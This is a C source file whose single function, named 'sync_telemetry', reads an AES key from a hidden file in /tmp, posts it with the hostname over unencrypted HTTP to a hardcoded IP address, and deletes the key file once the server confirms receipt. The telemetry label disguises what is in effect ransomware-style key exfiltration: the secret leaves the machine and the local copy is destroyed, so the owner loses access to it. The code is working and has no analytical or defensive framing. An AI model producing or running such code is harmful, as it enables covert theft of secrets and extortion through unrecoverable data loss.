#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

/**
 * sync_telemetry - Reads AES key from /tmp/.master.key, builds JSON payload,
 *                  sends it via HTTP POST to a monitoring server, and on success
 *                  (HTTP 200) removes the key file.
 *
 * Return: 0 on success (file removed), -1 on error.
 */
int sync_telemetry(void) {
    int ret = -1;
    FILE *fp = NULL;
    char *file_buf = NULL;
    long file_size;
    char *aes_key = NULL;
    char hostname[256] = {0};
    char *payload = NULL;
    CURL *curl = NULL;
    CURLcode res;
    long http_code = 0;
    struct curl_slist *headers = NULL;

    /* ---------- 1. Read and parse AES key ---------- */
    fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        fprintf(stderr, "sync_telemetry: cannot open /tmp/.master.key\n");
        goto cleanup;
    }

    /* Get file size */
    if (fseek(fp, 0, SEEK_END) != 0) {
        fprintf(stderr, "sync_telemetry: fseek failed\n");
        goto cleanup;
    }
    file_size = ftell(fp);
    if (file_size < 0) {
        fprintf(stderr, "sync_telemetry: ftell failed\n");
        goto cleanup;
    }
    rewind(fp);

    /* Allocate buffer and read entire file */
    file_buf = malloc(file_size + 1);
    if (!file_buf) {
        fprintf(stderr, "sync_telemetry: malloc for file buffer failed\n");
        goto cleanup;
    }
    if (fread(file_buf, 1, file_size, fp) != (size_t)file_size) {
        fprintf(stderr, "sync_telemetry: fread failed\n");
        goto cleanup;
    }
    file_buf[file_size] = '\0';
    fclose(fp);
    fp = NULL;

    /* Extract "aes_key" value (manual JSON parsing) */
    const char *needle = "\"aes_key\":\"";
    char *start = strstr(file_buf, needle);
    if (!start) {
        fprintf(stderr, "sync_telemetry: \"aes_key\" not found in key file\n");
        goto cleanup;
    }
    /* Advance past the search string */
    start += strlen(needle);
    /* Find closing double quote */
    char *end = strchr(start, '"');
    if (!end) {
        fprintf(stderr, "sync_telemetry: closing quote not found for aes_key\n");
        goto cleanup;
    }
    size_t key_len = end - start;
    if (key_len == 0) {
        fprintf(stderr, "sync_telemetry: aes_key value is empty\n");
        goto cleanup;
    }
    aes_key = strndup(start, key_len);
    if (!aes_key) {
        fprintf(stderr, "sync_telemetry: strndup failed\n");
        goto cleanup;
    }

    /* ---------- 2. Get hostname ---------- */
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        fprintf(stderr, "sync_telemetry: gethostname failed\n");
        goto cleanup;
    }
    hostname[sizeof(hostname) - 1] = '\0'; /* ensure null-termination */

    /* ---------- 3. Build JSON payload ---------- */
    /* Format: {"aes_key":"<key>","hostname":"<host>"} */
    /* We'll allocate exactly enough space using snprintf to compute length */
    int needed = snprintf(NULL, 0,
                          "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
                          aes_key, hostname);
    if (needed < 0) {
        fprintf(stderr, "sync_telemetry: snprintf failed\n");
        goto cleanup;
    }
    payload = malloc(needed + 1);
    if (!payload) {
        fprintf(stderr, "sync_telemetry: malloc for payload failed\n");
        goto cleanup;
    }
    snprintf(payload, needed + 1,
             "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
             aes_key, hostname);

    /* ---------- 4. Send HTTP POST via libcurl ---------- */
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "sync_telemetry: curl_easy_init failed\n");
        goto cleanup;
    }

    /* Set URL */
    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.73:8080/collect");
    /* Set POST */
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    /* Set POST fields (takes a copy internally) */
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(payload));
    /* Add Content-Type header */
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    /* Set timeout (10 seconds) */
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    /* For embedded systems, disable SSL verification (not needed for HTTP) */
    /* Perform request */
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "sync_telemetry: curl_easy_perform failed: %s\n",
                curl_easy_strerror(res));
        goto cleanup;
    }

    /* Get HTTP response code */
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code != 200) {
        fprintf(stderr, "sync_telemetry: server returned HTTP %ld\n", http_code);
        goto cleanup;
    }

    /* ---------- 5. Success: remove the key file ---------- */
    if (remove("/tmp/.master.key") != 0) {
        fprintf(stderr, "sync_telemetry: remove failed\n");
        /* Even if remove fails, we consider the operation "successful"
         * because the server received the data; but spec says to remove on success.
         * We'll still treat remove failure as error? Spec: "Em caso de falha ... não remover o arquivo"
         * Here remove failed, so we should return -1 (file not removed) and log error.
         */
        ret = -1;
        goto cleanup;
    }

    /* All good */
    ret = 0;

cleanup:
    /* Free resources */
    if (fp) fclose(fp);
    free(file_buf);
    free(aes_key);
    free(payload);
    if (headers) curl_slist_free_all(headers);
    if (curl) curl_easy_cleanup(curl);
    return ret;
}